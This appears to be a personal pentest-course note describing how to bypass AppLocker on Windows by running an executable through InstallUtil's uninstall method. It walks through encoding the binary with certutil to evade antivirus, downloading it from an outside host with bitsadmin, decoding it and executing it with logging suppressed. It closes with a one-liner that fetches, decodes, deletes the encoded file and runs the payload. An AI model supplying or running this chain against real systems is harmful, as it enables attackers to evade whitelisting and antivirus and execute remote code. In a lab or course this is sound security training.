Description:bypass the AppLocker executable rule by abusing the InstallUtil commmand line utility that allow us to install and unisntall server resources by executing the installer component in a assembly.
Only be using uninstall method since install method require admin priv.

References to add
<img width="1903" height="1079" alt="image" src="https://github.com/user-attachments/assets/cd524f87-76f9-4063-9863-86f2aa7f8333" />

To trigger the bypass we must invoked it through the installutil with /logfile to avoid logging to a file. 
/logfile=false to avoid.
/U to trigger the unisntall method 
```
C:\Users\User\source\repos\ConsoleApp1\ConsoleApp1\bin\x64\Release>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U ConsoleApp1.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.9032.0
Copyright (C) Microsoft Corporation.  All rights reserved.


C:\Users\User\source\repos\ConsoleApp1\ConsoleApp1\bin\x64\Release>type C:\Tools\test.txt
FullLanguage
```
Bypass AV by Ofuscating:
```
C:\Users\User\source\repos\ConsoleApp1\ConsoleApp1\bin\x64\Release>certutil -encode ConsoleApp1.exe file.txt
Input Length = 5120
Output Length = 7098
CertUtil: -encode command completed successfully.
```

Transfer to kali 
Download using bitsadmin and decode using certutil

```
c:\>c:\>bitsadmin /Transfer myJob http://192.168.1.23/test.txt C:\Users\User\enc.txt

 Volume in drive C is Windows
 Volume Serial Number is 4ADC-2BFC

 Directory of c:\

DISPLAY: 'myJob' TYPE: DOWNLOAD STATE: TRANSFERRED
PRIORITY: NORMAL FILES: 1 / 1 BYTES: 30 / 30 (100%)
Transfer complete.

c:\Users\User>certutil -decode enc.txt Bypass.exe
Input Length = 30
Output Length = 9
CertUtil: -decode command completed successfully.
```

Run
```
c:\Users\User>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\User\Bypass.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.9032.0
Copyright (C) Microsoft Corporation.  All rights reserved.
```

One Liner:
```
C:\Users\student>bitsadmin /Transfer myJob http://IP/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe  

```


